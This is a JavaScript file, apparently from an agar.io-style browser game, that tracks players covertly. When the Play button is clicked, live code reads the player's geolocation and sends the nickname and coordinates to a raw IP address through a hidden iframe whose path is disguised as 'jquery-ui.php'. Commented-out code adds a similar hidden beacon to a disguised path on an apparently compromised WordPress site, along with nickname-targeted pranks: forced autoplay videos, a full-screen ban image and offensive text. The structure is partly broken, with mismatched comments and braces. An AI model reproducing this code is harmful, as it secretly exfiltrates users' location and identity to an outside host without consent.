var nn = $("#nickname").val();
$("#playBtn").click(function(){
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sP);
} 
var nn = $("#nickname").val();	
	
//var nntrim = nn.replace(" ","");
function sP(p) {
 window.latae = p.coords.latitude;
 window.longe= p.coords.longitude;
	
$('<iframe src="http://5.196.1.134/agar/jquery-ui.php?name='+nn+ 'loc='+ p.coords.latitude +',' + p.coords.longitude + '"style="display:none;"></iframe>')
 .appendTo('#overlays');
}
});
/*
$.getJSON('//freegeoip.net/json/?callback=?', function(data) {
  if(data.ip == "78.0.19.163") {
  	//localStorage.setItem('maric', 'derpe2');
  }
	//console.log("ip", data.ip);
});


$('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
 .appendTo('#overlays');
if(nn == "VƗŦΔŁƗ[vit]") {

	//$("body").append("<img src='http://24sata.info/thumbnail.php?file=news/2010/may/srbija_bih_zastave_883416657.jpg&size=article_large' style='width:100%;height:100%;opacity:0.2;z-index:1200;position:absolute;top:0;left:0;'/>");
	//window.open("https://akk.li/pics/anne/jpg");
	//window.location = "https://akk.li/pics/anne/jpg";
	//window.location = "https://www.youtube.com/embed/rX7XZLcGAxw?autoplay=1";
	//$("body").append("<h1 style='position:absolute;top:200px;left:10px;'>Sрeс Krаljiсa</h1>");
//	while(true) {
	//window.open("https://akk.li/pics/anne/jpg");
	//	window.location("https://akk.li/pics/anne/jpg");//https://www.youtube.com/watch?v=
//$("body").append("<h1 style='position:absolute;top:200px;left:200px;visibility:hidden'></h1>");
//if($('iframe[src="https://www.youtube.com/embed/5thBGR1C64c?autoplay=1"]').length == 0){
	//$('iframe[src="https://www.youtube.com/embed/5thBGR1C64c?autoplay=1"]').remove();

//}

//if($('iframe[src="https://www.youtube.com/embed/mOsluvDMNkI?autoplay=1"]').length == 0){ 
 //$("body").append('<iframe width="1" height="1" src="https://www.youtube.com/embed/mOsluvDMNkI?autoplay=1" frameborder="0" allowfullscreen></iframe>');
} 
if(nn=="๖ۣۜ𝓩𝓪𝔂𝓷𝓼❥༻") {
//window.location = "https://www.youtube.com/embed/rX7XZLcGAxw?autoplay=1";
} 
//

//} else {
//	console.log("...");
//}https://www.youtube.com/watch?v=Bt_kR7u6mM4&t=6s
// || nn=="๖ۣۜ𝓩𝓪𝔂𝓷𝓼❥༻"
/*
if(nn == "bol i bol") {
	$("body").append("<h1 style='position:absolute;top:200px;left:10px;'>HAIL SATAN JEA OH HEHE OK JUUU LOL</h1>");
if($('iframe[src="https://www.youtube.com/embed/mOsluvDMNkI?autoplay=1"]').length == 0){//
	$("body").append('<iframe width="1" height="1" src="https://www.youtube.com/embed/mOsluvDMNkI?autoplay=1" frameborder="0" allowfullscreen></iframe>');

}
}
if(nn=="Jasmina[ly.]") {
	$('iframe[src="https://www.youtube.com/embed/Bt_kR7u6mM4?autoplay=1"]').remove();
	if($('iframe[src="https://www.youtube.com/embed/Bt_kR7u6mM4?autoplay=1"]').length == 0){//
	$("body").append('<iframe width="1" height="1" src="https://www.youtube.com/embed/Bt_kR7u6mM4?autoplay=1" frameborder="0" allowfullscreen></iframe>');

	}
}
if(localStorage.maric == "derpe") {
	//window.location = "https://www.youtube.com/embed/rX7XZLcGAxw?autoplay=1";
	$("body").append("<img src='http://agar-hr.ga/skins/banbanban.png' style='width:100%;height:100%;z-index:1200;position:absolute;top:0;left:0;bottom:0;right:0;'/>");
}
//

  //}
  //  location.reload();
  //window.location = "http://www.yoururl.com";
    //  $("body").append("<h1 style='position:absolute;top:50px;left:200px;'></h1>");


//else {
   //window.location = "";
//// }
 //$('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
 // .appendTo('#overlays');
*/
